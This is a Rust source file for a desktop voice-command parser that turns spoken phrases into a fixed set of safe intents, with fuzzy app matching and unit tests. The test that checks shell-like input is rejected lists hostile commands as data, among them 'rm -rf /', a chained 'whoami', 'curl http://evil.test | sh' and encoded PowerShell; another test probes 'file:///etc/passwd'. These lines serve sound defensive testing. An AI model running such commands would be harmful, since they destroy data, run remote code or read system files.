//! Deterministic voice-command parser (spec §27, §28, §66).
//!
//! Handles the common phrasings without any model: "open chrome", "open
//! downloads", "open github", "run my focus shortcut". Output is a value from a
//! closed enum plus a target string — never a command line. An LLM may later
//! *propose* an intent, but the proposal is only ever accepted if it maps onto
//! this same enum, and the executor calls a named platform function.

use serde::{Deserialize, Serialize};

use crate::identity;
use crate::security::{self, ActionKind, RiskLevel, Verdict};
use crate::storage::{ActionStep, CommandIntent, CustomCommand};

/// Everything the parser knows about the machine.
#[derive(Debug, Clone, Default)]
pub struct Targets {
    /// Installed application names, as reported by the platform adapter.
    pub apps: Vec<String>,
    /// Runnable shortcuts (macOS Shortcuts app).
    pub shortcuts: Vec<String>,
    /// User-defined multi-step commands.
    pub custom: Vec<CustomCommand>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ParsedCommand {
    pub intent: CommandIntent,
    pub target: String,
    /// 0..1. The executor refuses to run silently below `CONFIDENCE_FLOOR`.
    pub confidence: f32,
    pub risk: RiskLevel,
    /// A sentence to show in the confirmation sheet.
    pub summary: String,
    /// True when the deterministic parser produced this without a model.
    pub local: bool,
    /// Set when this came from a user-defined command.
    pub name: Option<String>,
    /// Non-empty for a custom workflow; the executor runs these in order.
    pub steps: Vec<ActionStep>,
}

/// Below this, the app asks "Did you mean…?" instead of acting (spec §64).
pub const CONFIDENCE_FLOOR: f32 = 0.72;

/// Well-known sites, so "open youtube" needs no network and no model.
const KNOWN_SITES: &[(&str, &str)] = &[
    ("youtube", "https://youtube.com"),
    ("github", "https://github.com"),
    ("gmail", "https://mail.google.com"),
    ("google", "https://google.com"),
    ("google maps", "https://maps.google.com"),
    ("maps", "https://maps.google.com"),
    ("chatgpt", "https://chatgpt.com"),
    ("claude", "https://claude.ai"),
    ("google drive", "https://drive.google.com"),
    ("drive", "https://drive.google.com"),
    ("google calendar", "https://calendar.google.com"),
    ("calendar", "https://calendar.google.com"),
    ("notion", "https://notion.so"),
    ("figma", "https://figma.com"),
    ("linkedin", "https://linkedin.com"),
    ("reddit", "https://reddit.com"),
    ("stack overflow", "https://stackoverflow.com"),
    ("x", "https://x.com"),
    ("twitter", "https://x.com"),
    ("netflix", "https://netflix.com"),
    ("spotify", "https://open.spotify.com"),
];

/// Spoken folder names that live directly under the user's home directory,
/// with the singular forms people actually say.
const HOME_FOLDERS: &[(&str, &str)] = &[
    ("downloads", "~/Downloads"),
    ("download", "~/Downloads"),
    ("documents", "~/Documents"),
    ("document", "~/Documents"),
    ("desktop", "~/Desktop"),
    ("pictures", "~/Pictures"),
    ("photos", "~/Pictures"),
    ("movies", "~/Movies"),
    ("music", "~/Music"),
    ("projects", "~/Projects"),
    ("project", "~/Projects"),
    ("public", "~/Public"),
    ("home", "~"),
];

/// Words that prefix a command but carry no meaning.
///
/// Compared against lowercased speech, so the product's spoken name appears in
/// the form a recogniser is most likely to produce it.
const LEAD_INS: &[&str] = &[
    "airprompt",
    "air prompt",
    "hey airprompt",
    "hey air prompt",
    "ok airprompt",
    "ok air prompt",
    "please",
    "can you",
    "could you",
    "would you",
];

const READ_VERBS: &[&str] = &["open", "launch", "start", "go to", "show me", "take me to"];

/// Parse a spoken phrase into a command, or `None` if nothing was recognised.
pub fn parse(raw: &str, targets: &Targets) -> Option<ParsedCommand> {
    let text = normalize(raw);
    if text.is_empty() {
        return None;
    }

    // Untrusted input is untrusted even when spoken (spec §99).
    if security::looks_like_shell(&text) {
        return None;
    }

    if let Some(command) = match_custom(&text, targets) {
        return Some(command);
    }

    let (verb, rest) = split_verb(&text);

    // A bare "stop" is the one command that works with no verb.
    if matches!(verb.as_str(), "stop" | "stop dictation" | "cancel") {
        return Some(simple(
            CommandIntent::StopDictation,
            String::new(),
            0.97,
            "Stop dictation".into(),
        ));
    }

    match verb.as_str() {
        "dictate" | "start dictation" | "type" | "start typing" => Some(simple(
            CommandIntent::Dictate,
            String::new(),
            0.95,
            "Start dictating".into(),
        )),

        "settings" | "open settings" | "preferences" | "open preferences" => Some(simple(
            CommandIntent::OpenSettings,
            String::new(),
            0.96,
            format!("Open {} settings", identity::APP_NAME),
        )),

        "change model" | "switch model" => Some(simple(
            CommandIntent::ChangeModel,
            rest.clone(),
            0.85,
            format!("Switch the speech model to {rest}"),
        )),

        "run" => parse_run(&rest, targets),

        "copy" | "copy text" => {
            let target = rest.trim().to_string();
            if target.is_empty() {
                return None;
            }
            Some(simple(
                CommandIntent::CopyText,
                target.clone(),
                0.9,
                format!("Copy “{target}” to the clipboard"),
            ))
        }

        "search" | "search for" | "google" | "look up" => {
            let query = rest.trim().to_string();
            if query.is_empty() {
                return None;
            }
            Some(simple(
                CommandIntent::SearchWeb,
                query.clone(),
                0.94,
                format!("Search the web for “{query}”"),
            ))
        }

        // "open <thing>" is the interesting case: the same verb covers apps,
        // sites and folders, and only the target tells them apart.
        v if READ_VERBS.contains(&v) => parse_open(&rest, targets),

        _ => None,
    }
}

/// Resolve "open <target>" into a specific intent.
fn parse_open(rest: &str, targets: &Targets) -> Option<ParsedCommand> {
    let target = rest.trim().trim_end_matches(" folder").trim().to_string();
    if target.is_empty() {
        return None;
    }

    // 1. A URL, a domain, or "localhost 3000".
    if let Some(url) = resolve_url(&target) {
        return Some(simple(
            CommandIntent::OpenUrl,
            url.clone(),
            0.95,
            format!("Open {url}"),
        ));
    }

    // 2. A folder under the home directory, or an explicit path.
    if is_folder(rest) {
        return Some(simple(
            CommandIntent::OpenFolder,
            target.clone(),
            0.9,
            format!("Open the {target} folder"),
        ));
    }
    if target.starts_with('~') || target.starts_with('/') || target.contains(":\\") {
        if let Err(_refused) = security::validate_path(&target) {
            return None;
        }
        return Some(simple(
            CommandIntent::OpenFolder,
            target.clone(),
            0.86,
            format!("Open {target}"),
        ));
    }

    // 3. A known site name ("github", "youtube").
    if let Some((_, url)) = KNOWN_SITES.iter().find(|(name, _)| *name == target) {
        return Some(simple(
            CommandIntent::OpenUrl,
            (*url).to_string(),
            0.95,
            format!("Open {url}"),
        ));
    }

    // 4. An installed application, fuzzily matched.
    if let Some((app, score)) = best_match(&target, &targets.apps) {
        let confidence = (score as f32 * 0.97).min(0.98);
        return Some(simple(
            CommandIntent::OpenApp,
            app.clone(),
            confidence,
            format!("Open {app}"),
        ));
    }

    // 5. A site we do not know: treat a domain-looking target as a URL.
    if looks_like_domain(&target) {
        return Some(simple(
            CommandIntent::OpenUrl,
            format!("https://{target}"),
            0.8,
            format!("Open https://{target}"),
        ));
    }

    // Nothing recognised. Guess the nearest application so the UI can ask.
    if let Some((app, score)) = best_match(&target, &targets.apps) {
        return Some(simple(
            CommandIntent::OpenApp,
            app.clone(),
            (score as f32 * 0.5).min(0.6),
            format!("Open {app}"),
        ));
    }
    None
}

fn parse_run(rest: &str, targets: &Targets) -> Option<ParsedCommand> {
    let cleaned = rest
        .trim()
        .trim_start_matches("my ")
        .trim_end_matches(" shortcut")
        .trim()
        .to_string();
    if cleaned.is_empty() {
        return None;
    }
    if let Some((name, score)) = best_match(&cleaned, &targets.shortcuts) {
        return Some(simple(
            CommandIntent::RunShortcut,
            name.clone(),
            (score as f32 * 0.96).min(0.98),
            format!("Run the “{name}” shortcut"),
        ));
    }
    // Shortcuts may be untitled from the app's point of view; still offer to run
    // exactly what was said, which the platform resolves itself.
    Some(simple(
        CommandIntent::RunShortcut,
        cleaned.clone(),
        0.6,
        format!("Run the “{cleaned}” shortcut"),
    ))
}

/// Match a user-defined command. Trigger phrases are matched on whole words so
/// "start coding" does not fire on "start coding tomorrow".
fn match_custom(text: &str, targets: &Targets) -> Option<ParsedCommand> {
    for command in &targets.custom {
        if !command.enabled || command.steps.is_empty() {
            continue;
        }
        for trigger in &command.triggers {
            let trigger = normalize(trigger);
            if trigger.is_empty() {
                continue;
            }
            // Exact match only. Command mode is entered deliberately with its
            // own shortcut, and a prefix match would make "start coding
            // tomorrow" launch a whole workspace.
            if text == trigger {
                let first = command.steps.first()?;
                let summary = format!(
                    "Run “{}”:\n{}",
                    command.name,
                    command
                        .steps
                        .iter()
                        .map(|step| format!("• {}", describe_step(step)))
                        .collect::<Vec<_>>()
                        .join("\n")
                );
                return Some(ParsedCommand {
                    intent: first.intent.clone(),
                    target: first.target.clone(),
                    confidence: 0.97,
                    risk: RiskLevel::Low,
                    summary,
                    local: true,
                    name: Some(command.name.clone()),
                    steps: command.steps.clone(),
                });
            }
        }
    }
    None
}

fn describe_step(step: &ActionStep) -> String {
    match step.intent {
        CommandIntent::OpenApp => format!("Open {}", step.target),
        CommandIntent::OpenUrl => format!("Open {}", step.target),
        CommandIntent::OpenFile => format!("Open file {}", step.target),
        CommandIntent::OpenFolder => format!("Open folder {}", step.target),
        CommandIntent::RunShortcut => format!("Run the {} shortcut", step.target),
        CommandIntent::CopyText => format!("Copy “{}”", step.target),
        CommandIntent::SearchWeb => format!("Search for “{}”", step.target),
        CommandIntent::Dictate => "Start dictating".into(),
        CommandIntent::StopDictation => "Stop dictating".into(),
        CommandIntent::ChangeModel => format!("Switch to the {} model", step.target),
        CommandIntent::OpenSettings => "Open settings".into(),
    }
}

/// Build a low-risk single-step command.
fn simple(
    intent: CommandIntent,
    target: String,
    confidence: f32,
    summary: String,
) -> ParsedCommand {
    let legacy = to_action_kind(&intent);
    let risk = match security::judge(legacy, &target) {
        Verdict::Blocked(_) => RiskLevel::High,
        Verdict::NeedsConfirmation(_) => RiskLevel::Medium,
        Verdict::Allowed => RiskLevel::Low,
    };
    ParsedCommand {
        intent,
        target,
        confidence,
        risk,
        summary,
        local: true,
        name: None,
        steps: Vec::new(),
    }
}

pub fn to_action_kind(intent: &CommandIntent) -> ActionKind {
    match intent {
        CommandIntent::OpenApp => ActionKind::OpenApp,
        CommandIntent::OpenUrl => ActionKind::OpenUrl,
        CommandIntent::OpenFile => ActionKind::OpenFile,
        CommandIntent::OpenFolder => ActionKind::OpenFolder,
        CommandIntent::RunShortcut => ActionKind::RunShortcut,
        CommandIntent::CopyText => ActionKind::CopyText,
        CommandIntent::SearchWeb => ActionKind::SearchWeb,
        CommandIntent::Dictate => ActionKind::Dictate,
        CommandIntent::StopDictation => ActionKind::StopDictation,
        CommandIntent::ChangeModel => ActionKind::ChangeModel,
        CommandIntent::OpenSettings => ActionKind::OpenSettings,
    }
}

/* ------------------------------------------------------------- utilities */

/// Lowercase, drop punctuation, and remove leading pleasantries.
fn normalize(raw: &str) -> String {
    let mut text: String = raw
        .trim()
        .to_lowercase()
        .chars()
        .filter(|c| {
            !matches!(
                c,
                '.' | ',' | '!' | '?' | ';' | ':' | '"' | '\u{201C}' | '\u{201D}'
            )
        })
        .collect();
    text = text.split_whitespace().collect::<Vec<_>>().join(" ");

    // Strip at most one lead-in, longest first ("hey airprompt" before "airprompt").
    let mut leads: Vec<&str> = LEAD_INS.to_vec();
    leads.sort_by_key(|l| std::cmp::Reverse(l.len()));
    for lead in leads {
        if let Some(rest) = text.strip_prefix(lead) {
            if rest.starts_with(' ') {
                text = rest.trim_start().to_string();
                break;
            }
        }
    }
    text
}

/// Split a leading verb from the remainder, preferring the longest verb.
fn split_verb(text: &str) -> (String, String) {
    let mut verbs: Vec<&str> = READ_VERBS
        .iter()
        .chain(
            [
                "stop dictation",
                "stop",
                "cancel",
                "dictate",
                "start dictation",
                "start typing",
                "type",
                "settings",
                "open settings",
                "preferences",
                "open preferences",
                "change model",
                "switch model",
                "search for",
                "search",
                "google",
                "look up",
                "copy text",
                "copy",
                "run",
            ]
            .iter(),
        )
        .copied()
        .collect();
    verbs.sort_by_key(|v| std::cmp::Reverse(v.len()));

    for verb in verbs {
        if text == verb {
            return (verb.to_string(), String::new());
        }
        if let Some(rest) = text.strip_prefix(verb) {
            if rest.starts_with(' ') {
                return (verb.to_string(), rest.trim().to_string());
            }
        }
    }
    (text.to_string(), String::new())
}

/// Recognise an explicit URL, a bare domain, or "localhost <port>".
fn resolve_url(target: &str) -> Option<String> {
    let candidate = target.replace(" dot ", ".").replace(" dot com", ".com");
    let candidate = candidate.trim();

    if candidate.contains("://") {
        return security::validate_url(candidate).ok();
    }

    // "localhost 3000" -> http://localhost:3000
    if let Some(rest) = candidate.strip_prefix("localhost") {
        let port = rest.trim().trim_start_matches(':').trim();
        let url = if port.is_empty() {
            "http://localhost".to_string()
        } else if port.chars().all(|c| c.is_ascii_digit()) {
            format!("http://localhost:{port}")
        } else {
            return None;
        };
        return Some(url);
    }

    if looks_like_domain(candidate) {
        return security::validate_url(&format!("https://{candidate}")).ok();
    }
    None
}

fn looks_like_domain(target: &str) -> bool {
    let host = target.split('/').next().unwrap_or("");
    if host.is_empty() || host.contains(' ') {
        return false;
    }
    // Require a dot followed by at least two letters, so "notepad.exe" and
    // bare words are not mistaken for domains.
    match host.rsplit_once('.') {
        Some((name, tld)) => {
            !name.is_empty()
                && tld.len() >= 2
                && tld.chars().all(|c| c.is_ascii_alphabetic())
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '.'))
        }
        None => false,
    }
}

fn is_folder(rest: &str) -> bool {
    let lower = rest.to_lowercase();
    let trimmed = lower.trim_end_matches(" folder").trim();
    home_folder_target(trimmed).is_some()
}

/// Map a spoken folder name to a real path under the user's home directory.
///
/// `~` is expanded by the platform adapter, which knows the real home path.
pub fn home_folder_target(name: &str) -> Option<String> {
    let lower = name.trim().to_lowercase();
    HOME_FOLDERS
        .iter()
        .find(|(spoken, _)| *spoken == lower)
        .map(|(_, path)| (*path).to_string())
}

/// Best fuzzy match in `candidates`, with a 0..1 score.
///
/// Ordering of the strategies matters: an exact match must always beat a
/// substring hit, otherwise "code" would match "Code Helper" over "Code".
pub fn best_match(query: &str, candidates: &[String]) -> Option<(String, f64)> {
    let needle = query.trim().to_lowercase();
    if needle.is_empty() {
        return None;
    }

    let mut best: Option<(String, f64)> = None;
    for candidate in candidates {
        let haystack = candidate.to_lowercase();
        let score = if haystack == needle {
            1.0
        } else if haystack.starts_with(&needle) {
            0.92
        } else if haystack.contains(&needle) {
            // Prefer the shortest containing candidate, so "chrome" picks
            // "Google Chrome" over "Google Chrome Canary Helper".
            0.84 - (haystack.len().saturating_sub(needle.len()) as f64).min(20.0) / 200.0
        } else if acronym(&haystack) == needle {
            0.86
        } else {
            let similarity =
                1.0 - levenshtein(&needle, &haystack) as f64 / haystack.len().max(1) as f64;
            if similarity < 0.6 {
                continue;
            }
            similarity * 0.75
        };

        if best.as_ref().map(|(_, s)| score > *s).unwrap_or(true) {
            best = Some((candidate.clone(), score));
        }
    }
    best
}

/// "visual studio code" -> "vsc" so "vsc" resolves.
fn acronym(haystack: &str) -> String {
    haystack
        .split(|c: char| !c.is_alphanumeric())
        .filter(|word| !word.is_empty())
        .filter_map(|word| word.chars().next())
        .collect()
}

pub fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    if a.is_empty() {
        return b.len();
    }
    if b.is_empty() {
        return a.len();
    }
    let mut previous: Vec<usize> = (0..=b.len()).collect();
    let mut current = vec![0usize; b.len() + 1];
    for (i, ca) in a.iter().enumerate() {
        current[0] = i + 1;
        for (j, cb) in b.iter().enumerate() {
            let cost = usize::from(ca != cb);
            current[j + 1] = (previous[j + 1] + 1)
                .min(current[j] + 1)
                .min(previous[j] + cost);
        }
        std::mem::swap(&mut previous, &mut current);
    }
    previous[b.len()]
}

#[cfg(test)]
mod tests {
    use super::*;

    fn targets() -> Targets {
        Targets {
            apps: vec![
                "Google Chrome".into(),
                "Safari".into(),
                "Visual Studio Code".into(),
                "Spotify".into(),
                "Terminal".into(),
                "Notes".into(),
            ],
            shortcuts: vec!["Morning Routine".into(), "Focus".into()],
            custom: Vec::new(),
        }
    }

    fn intent_of(text: &str) -> Option<CommandIntent> {
        parse(text, &targets()).map(|c| c.intent)
    }

    #[test]
    fn resolves_apps_fuzzily() {
        let command = parse("open chrome", &targets()).unwrap();
        assert_eq!(command.intent, CommandIntent::OpenApp);
        assert_eq!(command.target, "Google Chrome");
        assert!(
            command.confidence > CONFIDENCE_FLOOR,
            "{}",
            command.confidence
        );

        // An acronym resolves too.
        let command = parse("open vsc", &targets()).unwrap();
        assert_eq!(command.target, "Visual Studio Code");

        // Exact match beats a longer containing name.
        let command = parse("open safari", &targets()).unwrap();
        assert_eq!(command.target, "Safari");
    }

    #[test]
    fn resolves_known_sites_without_a_network() {
        let command = parse("open youtube", &targets()).unwrap();
        assert_eq!(command.intent, CommandIntent::OpenUrl);
        assert_eq!(command.target, "https://youtube.com");

        let command = parse("open github", &targets()).unwrap();
        assert_eq!(command.target, "https://github.com");
    }

    #[test]
    fn resolves_domains_and_localhost() {
        let command = parse("open github.com", &targets()).unwrap();
        assert_eq!(command.intent, CommandIntent::OpenUrl);
        assert_eq!(command.target, "https://github.com");

        let command = parse("open localhost 3000", &targets()).unwrap();
        assert_eq!(command.target, "http://localhost:3000");

        let command = parse("open localhost", &targets()).unwrap();
        assert_eq!(command.target, "http://localhost");

        // Spoken "dot" is understood.
        let command = parse("open example dot com", &targets()).unwrap();
        assert_eq!(command.target, "https://example.com");
    }

    #[test]
    fn resolves_home_folders() {
        let command = parse("open downloads", &targets()).unwrap();
        assert_eq!(command.intent, CommandIntent::OpenFolder);
        assert_eq!(command.target, "~/Downloads");

        let command = parse("open downloads folder", &targets()).unwrap();
        assert_eq!(command.target, "~/Downloads");

        let command = parse("open project folder", &targets()).unwrap();
        assert_eq!(command.target, "~/Projects");

        // Singular forms people actually say.
        assert_eq!(
            parse("open download", &targets()).unwrap().target,
            "~/Downloads"
        );
        assert_eq!(
            parse("open photos", &targets()).unwrap().target,
            "~/Pictures"
        );
    }

    #[test]
    fn resolves_shortcuts_and_flags_them_for_confirmation() {
        let command = parse("run my morning routine", &targets()).unwrap();
        assert_eq!(command.intent, CommandIntent::RunShortcut);
        assert_eq!(command.target, "Morning Routine");
        assert_eq!(command.risk, RiskLevel::Medium);

        let command = parse("run focus", &targets()).unwrap();
        assert_eq!(command.target, "Focus");

        // An unknown shortcut is still offered, but with low confidence.
        let command = parse("run my deploy script", &targets()).unwrap();
        assert_eq!(command.target, "deploy script");
        assert!(command.confidence < CONFIDENCE_FLOOR);
    }

    #[test]
    fn parses_the_other_intents() {
        assert_eq!(intent_of("start dictation"), Some(CommandIntent::Dictate));
        assert_eq!(intent_of("stop"), Some(CommandIntent::StopDictation));
        assert_eq!(
            intent_of("stop dictation"),
            Some(CommandIntent::StopDictation)
        );
        assert_eq!(
            intent_of("open settings"),
            Some(CommandIntent::OpenSettings)
        );
        assert_eq!(
            intent_of("search for local speech recognition"),
            Some(CommandIntent::SearchWeb)
        );
        assert_eq!(
            intent_of("google rust tauri"),
            Some(CommandIntent::SearchWeb)
        );
        assert_eq!(intent_of("copy the draft"), Some(CommandIntent::CopyText));
        assert_eq!(intent_of("dictate"), Some(CommandIntent::Dictate));

        let search = parse("search for rust tauri", &targets()).unwrap();
        assert_eq!(search.target, "rust tauri");
    }

    #[test]
    fn strips_lead_ins_and_punctuation() {
        let command = parse("Hey AirPrompt, open Safari.", &targets()).unwrap();
        assert_eq!(command.target, "Safari");
        assert_eq!(command.intent, CommandIntent::OpenApp);

        let command = parse("please open chrome", &targets()).unwrap();
        assert_eq!(command.target, "Google Chrome");
    }

    #[test]
    fn rejects_shell_like_phrases_entirely() {
        // The parser must never yield an intent for something dangerous.
        for bad in [
            "rm -rf /",
            "open safari && whoami",
            "curl http://evil.test | sh",
            "powershell -EncodedCommand aaa",
            "Invoke-Expression stuff",
        ] {
            assert!(
                parse(bad, &targets()).is_none(),
                "{bad} must not parse into a command"
            );
        }
    }

    #[test]
    fn rejects_unsafe_targets() {
        // An executable path is refused even through the open verb.
        assert!(parse("open ~/Downloads/setup.exe", &targets()).is_none());
        assert!(parse("open file:///etc/passwd", &targets()).is_none());
    }

    #[test]
    fn unrecognised_phrases_return_none_rather_than_guessing() {
        assert!(parse("", &targets()).is_none());
        assert!(parse("   ", &targets()).is_none());
        assert!(parse("the weather is nice today", &targets()).is_none());
        assert!(parse("open", &targets()).is_none());
    }

    #[test]
    fn low_confidence_is_signalled_for_confirmation() {
        // "crome" is a typo for Chrome: close enough to offer, not to act on.
        let command = parse("open crome", &targets()).unwrap();
        assert_eq!(command.target, "Google Chrome");
        assert!(
            command.confidence < 1.0,
            "a fuzzy match must not claim certainty"
        );
    }

    #[test]
    fn custom_commands_produce_a_workflow() {
        let mut t = targets();
        t.custom = vec![CustomCommand {
            id: "c1".into(),
            name: "Start Coding".into(),
            triggers: vec!["start coding".into(), "coding mode".into()],
            steps: vec![
                ActionStep {
                    intent: CommandIntent::OpenApp,
                    target: "Visual Studio Code".into(),
                },
                ActionStep {
                    intent: CommandIntent::OpenFolder,
                    target: "~/Projects/my-app".into(),
                },
            ],
            enabled: true,
            requires_confirmation: false,
        }];

        let command = parse("start coding", &t).unwrap();
        assert_eq!(command.name.as_deref(), Some("Start Coding"));
        assert_eq!(command.steps.len(), 2, "a workflow must keep every step");
        assert!(command.summary.contains("Visual Studio Code"));
        assert!(command.summary.contains("~/Projects/my-app"));
        assert!(command.local);

        // The trigger must not fire from inside a longer unrelated sentence.
        assert!(
            parse("start coding tomorrow morning", &t).is_none(),
            "a trigger must not swallow an unrelated sentence"
        );

        // A disabled command is ignored.
        t.custom[0].enabled = false;
        assert!(parse("start coding", &t).is_none());
    }

    #[test]
    fn fuzzy_matching_prefers_the_closest_name() {
        let apps = vec![
            "Google Chrome".to_string(),
            "Google Chrome Canary".to_string(),
            "Chromium".to_string(),
        ];
        let (name, _) = best_match("chrome", &apps).unwrap();
        assert_eq!(name, "Google Chrome");

        let (name, _) = best_match("chromium", &apps).unwrap();
        assert_eq!(name, "Chromium");

        assert!(best_match("", &apps).is_none());
        assert!(best_match("zzzzzzzz", &apps).is_none());
    }

    #[test]
    fn levenshtein_is_correct() {
        assert_eq!(levenshtein("", ""), 0);
        assert_eq!(levenshtein("abc", "abc"), 0);
        assert_eq!(levenshtein("abc", ""), 3);
        assert_eq!(levenshtein("", "abc"), 3);
        assert_eq!(levenshtein("kitten", "sitting"), 3);
        assert_eq!(levenshtein("chrome", "crome"), 1);
    }

    #[test]
    fn every_intent_maps_to_an_allowlisted_action() {
        // Guards against adding an intent that has no executor behind it.
        for intent in [
            CommandIntent::OpenApp,
            CommandIntent::OpenUrl,
            CommandIntent::OpenFile,
            CommandIntent::OpenFolder,
            CommandIntent::RunShortcut,
            CommandIntent::CopyText,
            CommandIntent::SearchWeb,
            CommandIntent::Dictate,
            CommandIntent::StopDictation,
            CommandIntent::ChangeModel,
            CommandIntent::OpenSettings,
        ] {
            let kind = to_action_kind(&intent);
            assert!(!kind.as_str().is_empty());
            assert_ne!(kind.risk(), RiskLevel::High);
        }
    }
}
